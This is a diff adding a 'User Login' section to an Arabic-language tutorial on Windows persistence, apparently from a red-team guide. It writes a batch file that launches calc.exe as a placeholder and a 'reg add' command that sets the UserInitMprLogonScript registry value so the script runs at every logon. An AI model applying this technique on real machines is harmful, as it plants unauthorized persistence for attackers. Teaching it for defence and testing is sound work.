@@ -215,3 +215,32 @@ C:\Windows\System32
 ### `Demo:`
 
 ![](../../images/persistence/17.gif)
+
+
+## User Login
+
+<html>
+<div dir="rtl" align="right">
+نقدر نعدل على ال registry ونخلي كل مرة المستخدم يسجل دخول يشتغل برنامجنا. أول شي رح تسويه هو انك تكتب الملف الأتي:
+</div>
+</html>
+
+`zoldyck.bat:`
+
+```bat
+@ECHO OFF
+
+C:\Windows\System32\calc.exe
+```
+
+<html>
+<div dir="rtl" align="right">
+أستخدم الكوماند الي تحت عشان تعدل على ال registry:
+</div>
+</html>
+
+`reg add "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /d "C:\temp\zoldyck.bat" /t REG_SZ /f`
+
+### `Demo:`
+
+![](../../images/persistence/18.gif)
